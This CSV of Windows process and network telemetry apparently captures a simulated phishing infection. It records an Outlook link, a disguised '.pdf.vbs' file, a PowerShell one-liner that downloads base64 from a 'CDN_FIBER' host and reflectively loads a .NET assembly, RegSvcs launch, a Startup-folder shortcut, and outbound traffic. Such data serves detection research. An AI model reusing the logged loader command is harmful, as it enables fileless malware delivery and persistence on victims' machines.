host,processUUID,processName,event,objectType,objectData,objectUUID,timestamp,CommandLine
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,798f9b45-ff27-4714-9ac4-de7c2d98e572,25:15.6,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,1eb330cf-cec9-4fb9-ade1-548aa70cad34,25:16.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,cfbedbdf-dd72-480d-b4c7-2b28c1b5e115,25:17.0,
win11,8b172d3c-cc95-4e22-a745-da831d60edaf,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,25:38.7,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --single-argument http://dian-info.com/notificaciones/contribuyentes/factura-228447578537"
win11,8b172d3c-cc95-4e22-a745-da831d60edaf,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,1ddedcfe-4480-405b-95ae-f1bef94bc158,25:38.7,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,6895bd66-7b59-428b-a50c-328ce12ad89b,25:44.7,
win11,6895bd66-7b59-428b-a50c-328ce12ad89b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\System32\wscript.exe,f888b8e0-8e76-4db7-a3c3-e9d34ad77fef,25:44.8,"""C:\windows\System32\WScript.exe"" ""C:\Users\user\Downloads\factura-228447578537.pdf.vbs"""
win11,6895bd66-7b59-428b-a50c-328ce12ad89b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\System32\wscript.exe,2a5f5770-7898-4937-a0ee-0bd7139222b3,25:44.8,
win11,2a5f5770-7898-4937-a0ee-0bd7139222b3,C:\Windows\System32\wscript.exe,execute,file,C:\Windows\System32\cmd.exe,ba01a43e-9c47-48f5-81b3-3f87adc8d086,25:45.4,"""C:\windows\system32\cmd.exe"" /c powershell.exe [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,2a5f5770-7898-4937-a0ee-0bd7139222b3,C:\Windows\System32\wscript.exe,fork,process,C:\Windows\System32\cmd.exe,622aeaa3-c722-49ad-8538-a9ac9c74f898,25:45.4,
win11,622aeaa3-c722-49ad-8538-a9ac9c74f898,C:\Windows\System32\cmd.exe,execute,file,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,6d41b2d8-7340-409e-8e15-fabf018cc2c7,25:45.5,"powershell.exe  [Byte[]] $rOWg = [system.Convert]::FromBase64string((New-Object Net.WebClient).DownloadString('http://CDN_FIBER/dll/new_rump_vb.net.txt'));[System.AppDomain]::CurrentDomain.Load($rOWg).GetType('fiber.Home').GetMethod('VAI').Invoke($null, [object[]] ('ø☀☞√�}П�◀@+@░�@@ø☀☞√�}П�.ysa4*●*☞#:▶REBIF_NDC4*●*☞#:▶4*●*☞#:▶▶☟ð}↓→+◀pø☀☞√�}П�ø☀☞√�}П�↓*(▲☟@*⇝'))"
win11,622aeaa3-c722-49ad-8538-a9ac9c74f898,C:\Windows\System32\cmd.exe,fork,process,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,be4899a3-ce14-451b-880e-a58dcacb9fda,25:45.5,
win11,be4899a3-ce14-451b-880e-a58dcacb9fda,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Local\Temp\__PSScriptPolicyTest_dhqp0kyk.syt.ps1,feca7275-af69-4da0-8b43-0f83a71c7ffc,25:46.1,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,execute,file,C:\Windows\ImmersiveControlPanel\SystemSettings.exe,bdc99109-117c-4682-9750-e7a045c049c9,25:48.5,"""C:\Windows\ImmersiveControlPanel\SystemSettings.exe"" -ServerName:microsoft.windows.immersivecontrolpanel"
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\ImmersiveControlPanel\SystemSettings.exe,15a5f881-bb9f-4287-a18b-381a80a996fd,25:48.5,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,3deb0ac8-48bf-49f9-86da-f3e2d6a814ce,25:49.6,
win11,3deb0ac8-48bf-49f9-86da-f3e2d6a814ce,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,25:49.8,explorer.exe C:\Users\Public\Documents
win11,3deb0ac8-48bf-49f9-86da-f3e2d6a814ce,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,8389621f-de2a-435a-998d-77a5583e888c,25:49.8,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,69d2a89e-4fb8-4577-8c05-e197bfe3054f,25:49.8,
win11,4926cb97-a7ea-4338-994f-d2352431b2ee,C:\Program Files\Google\Chrome\Application\chrome.exe,write,file,C:\Users\user\Downloads\f5d87764-0721-4220-856a-aebb53c14d56.tmp,145cee2f-42bb-4100-a77b-8f94ed5dc803,26:00.0,
win11,be4899a3-ce14-451b-880e-a58dcacb9fda,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\Downloads\fiber_logs.txt,f155cf93-e154-4ab1-aaaf-751d92c8ec9a,26:00.1,
win11,be4899a3-ce14-451b-880e-a58dcacb9fda,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,execute,file,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,45811814-a282-490d-a49d-3fe52153f8ba,26:00.1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe"""
win11,be4899a3-ce14-451b-880e-a58dcacb9fda,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,fork,process,C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe,737d47f3-56f7-4388-8dc2-79a61627f116,26:00.1,
win11,be4899a3-ce14-451b-880e-a58dcacb9fda,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,write,file,C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.lnk,30c8bc96-40ce-40cd-896b-07c84b82e61f,26:00.3,
win11,cae9f90d-8b96-4b7c-a72c-456b617e82fa,C:\Windows\System32\svchost.exe,execute,file,C:\Windows\System32\taskhostw.exe,3d19f84d-d349-4b69-a799-e71e78723377,26:01.6,taskhostw.exe
win11,cae9f90d-8b96-4b7c-a72c-456b617e82fa,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\System32\taskhostw.exe,ee952a94-a9d2-425b-8772-32daace00f10,26:01.7,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,d9c30615-26e7-43ef-bfe2-3d6dfc493f53,26:05.3,
win11,d9c30615-26e7-43ef-bfe2-3d6dfc493f53,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,26:05.3,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,d9c30615-26e7-43ef-bfe2-3d6dfc493f53,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,1cdb2450-a788-4eed-acee-4befafeef446,26:05.3,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,8afebff6-c8e2-4409-8edb-f944c369263d,26:13.4,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,78111687-7fce-4f65-969d-16380c5ac3fe,26:14.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,b5f4d291-57ba-4556-948d-0a67b04c5f11,26:14.9,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,a3392cb6-bf1f-42ac-8e40-fcacc871f11c,26:15.7,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,7ffccd18-8da3-4549-a092-f1a55a25a447,26:16.4,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,a186c5e3-0b15-4c09-bdbe-d4c6e7b8757a,26:17.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,b2afb413-ff21-48f1-bead-1dff8235b8ad,26:31.0,
win11,b2afb413-ff21-48f1-bead-1dff8235b8ad,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,26:31.1,explorer.exe C:\Users\Public\Documents
win11,b2afb413-ff21-48f1-bead-1dff8235b8ad,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,bb512242-a7d3-4a28-8ba4-d4283f4a6a8c,26:31.1,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,5d685926-9e39-4ad9-bbff-cc909070a862,26:31.1,
win11,5d685926-9e39-4ad9-bbff-cc909070a862,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,26:37.6,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,5d685926-9e39-4ad9-bbff-cc909070a862,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,28f77ebb-eba8-4ddd-86e1-c08324bf7525,26:37.6,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,f64c0e8a-a1d7-4322-a434-b473c8fe5cd1,26:42.8,
win11,f64c0e8a-a1d7-4322-a434-b473c8fe5cd1,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,26:42.9,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,f64c0e8a-a1d7-4322-a434-b473c8fe5cd1,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,d9cb547b-bf04-46f7-90cc-e6c69bf46fa9,26:42.9,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,b65d1f07-247a-4e6b-b52b-835175b259d7,26:56.6,
win11,b65d1f07-247a-4e6b-b52b-835175b259d7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,26:56.7,explorer.exe C:\Users\Public\Documents
win11,b65d1f07-247a-4e6b-b52b-835175b259d7,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,c847cb0f-2a45-476b-b20f-6b6158904dd9,26:56.7,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,ed14ab31-b930-4e78-a4cf-2a91df1fb2c5,26:56.7,
win11,ed14ab31-b930-4e78-a4cf-2a91df1fb2c5,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,27:03.2,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,ed14ab31-b930-4e78-a4cf-2a91df1fb2c5,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,fdc1c6da-84cc-4143-bf37-1593e51e0622,27:03.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,14c6680c-2ecd-4e9a-bc43-1df3a7ae2f62,27:13.4,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,03f7378b-9aca-4a06-aec9-ae49394dc07b,27:14.0,
win11,03f7378b-9aca-4a06-aec9-ae49394dc07b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,27:14.1,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,03f7378b-9aca-4a06-aec9-ae49394dc07b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,b30ec73e-c69f-48a6-8dff-76d1428f9109,27:14.1,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,c16731b3-3c8b-417e-b115-6fae69090d09,27:14.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,cc51a008-0de6-4c8a-9adb-ed189a62a8f6,27:14.8,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,b0876447-653d-4451-93d8-0eb250e5e713,27:15.6,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,08c60047-dc27-4431-a57e-e4a49a3146c6,27:16.3,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,fee09980-0f7b-42e9-a560-d0b0d91eb6d8,27:17.1,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,d5be4036-c11c-4765-9d8b-687030e4f2f5,27:33.9,
win11,d5be4036-c11c-4765-9d8b-687030e4f2f5,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,27:34.0,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,d5be4036-c11c-4765-9d8b-687030e4f2f5,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,fdc4e659-4215-4f1a-a238-9c7a2913766a,27:34.0,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,6255006a-21fe-4c0a-94e5-eed88fa5e81b,27:46.9,
win11,6255006a-21fe-4c0a-94e5-eed88fa5e81b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,27:46.9,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,6255006a-21fe-4c0a-94e5-eed88fa5e81b,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,7bf481dc-6b05-45cd-8a8b-c31e71933af3,27:46.9,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,414f7f81-2238-4a44-96a6-dc7078d91391,28:00.7,
win11,414f7f81-2238-4a44-96a6-dc7078d91391,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,28:00.7,explorer.exe C:\Users\Public\Documents
win11,414f7f81-2238-4a44-96a6-dc7078d91391,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,14c90780-5a0e-465d-b0ee-df3b7ab7fb8c,28:00.7,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,89de4fba-f8e8-4380-b4b7-d46ee17319f9,28:00.7,
win11,89de4fba-f8e8-4380-b4b7-d46ee17319f9,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,28:07.2,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,89de4fba-f8e8-4380-b4b7-d46ee17319f9,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,8e5d0859-dd1d-445b-9d33-ff29d47b82c1,28:07.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,314085e7-9fd3-487f-8323-a9f0f9795e08,28:13.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,e7dac3e5-abdf-44f2-9814-8e36a441287f,28:14.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,c2bec9da-ec03-4d0a-9b2e-e67bc15b95a6,28:15.0,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,6c0ac435-b2af-4160-9bb7-aba23e0bb053,28:15.7,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe,c7ce9742-630a-435e-bf09-5afc968c86b9,28:16.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,f20c484a-53ec-4632-b5f1-dde41f42bd22,28:17.2,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,1e602c8f-9546-4d5f-ab19-2ace24dfe6d9,28:19.1,
win11,1e602c8f-9546-4d5f-ab19-2ace24dfe6d9,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,28:19.1,explorer.exe C:\Users\Public\Documents
win11,1e602c8f-9546-4d5f-ab19-2ace24dfe6d9,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,616aab46-647f-4193-97bb-fe740d30e4b0,28:19.1,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,db12372f-bd3e-429b-9a5e-fdc74f54557d,28:19.1,
win11,db12372f-bd3e-429b-9a5e-fdc74f54557d,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,28:25.7,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,db12372f-bd3e-429b-9a5e-fdc74f54557d,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,ed30c5f8-2a0b-4a27-b378-f5c646522dae,28:25.7,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,5fdfee1e-b2ad-47e9-a837-60e3030bf861,28:42.5,
win11,5fdfee1e-b2ad-47e9-a837-60e3030bf861,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,28:42.6,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --new-window"
win11,5fdfee1e-b2ad-47e9-a837-60e3030bf861,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,3c1e74c3-163f-4685-8599-83973316b479,28:42.6,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,05139b7f-b2b3-439c-9a9b-4d6a4b238646,28:55.6,
win11,05139b7f-b2b3-439c-9a9b-4d6a4b238646,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Program Files\Google\Chrome\Application\chrome.exe,e61dbe4c-ad87-40c2-b1dd-b2896d43b763,28:55.7,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
win11,05139b7f-b2b3-439c-9a9b-4d6a4b238646,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Program Files\Google\Chrome\Application\chrome.exe,a7781190-36b0-445a-b19d-688568a2fbb7,28:55.7,
win11,410dd107-77c9-45d5-afb6-b31c997925a1,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,send,socket,192.168.150.104:80.0,a288081c-8bdf-4686-a5ab-d0e6a46e1bb9,28:57.7,
win11,410dd107-77c9-45d5-afb6-b31c997925a1,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,receive,socket,192.168.150.104:80.0,a288081c-8bdf-4686-a5ab-d0e6a46e1bb9,28:57.7,
win11,410dd107-77c9-45d5-afb6-b31c997925a1,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,send,dns,cdn_fiber,1c0b87a6-c7a0-4c27-a8df-0425026d4332,28:57.7,
win11,410dd107-77c9-45d5-afb6-b31c997925a1,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,receive,dns,192.168.150.104:0,6662adb4-136c-4291-8c2e-e8d8f0f83c35,28:57.7,
win11,0d04361a-1158-44b8-bca3-c75e304155ed,-,fork,process,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,2a85b2c5-8a13-4e46-ae99-6de8debe0fa5,29:09.5,
win11,2a85b2c5-8a13-4e46-ae99-6de8debe0fa5,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,execute,file,C:\Windows\explorer.exe,fda9ab03-6892-43c5-b585-c776f8a2e9c3,29:09.6,explorer.exe C:\Users\Public\Documents
win11,2a85b2c5-8a13-4e46-ae99-6de8debe0fa5,C:\Program Files\AutoHotkey\v2\AutoHotkey64.exe,fork,process,C:\Windows\explorer.exe,5117f2ad-1d49-410c-a125-854cfb756a6d,29:09.6,
win11,e4621e67-ff38-48cf-a760-24b01e81b0da,C:\Windows\System32\svchost.exe,fork,process,C:\Windows\explorer.exe,aeacb73f-4da8-4472-9007-b2dee84603f2,29:09.6,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe,00abac9d-8aec-4eaa-afc0-c996515032b9,29:13.5,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe,3ef20cc8-f175-4392-97bc-a461634d2d9e,29:14.2,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe,fceade99-fe1e-4f57-baa9-0abc5ffe3fde,29:14.8,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,79e737e2-8eb8-4c27-9c7c-b306c96ba0f7,29:15.6,
win11,aeacb73f-4da8-4472-9007-b2dee84603f2,C:\Windows\explorer.exe,execute,file,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,4d0dc02f-bdb7-4ea1-82aa-c59c8db7095c,29:16.1,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\Public\Documents\organization-workers.xlsx"""
win11,aeacb73f-4da8-4472-9007-b2dee84603f2,C:\Windows\explorer.exe,fork,process,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,15c8e73f-55de-4ae8-98f1-710da399212d,29:16.1,
win11,15d26c99-4cea-40ff-9157-34fb228e3f48,C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe,fork,process,C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe,ae1bce9c-f4c5-42a9-b82e-f840b38d909d,29:16.4,
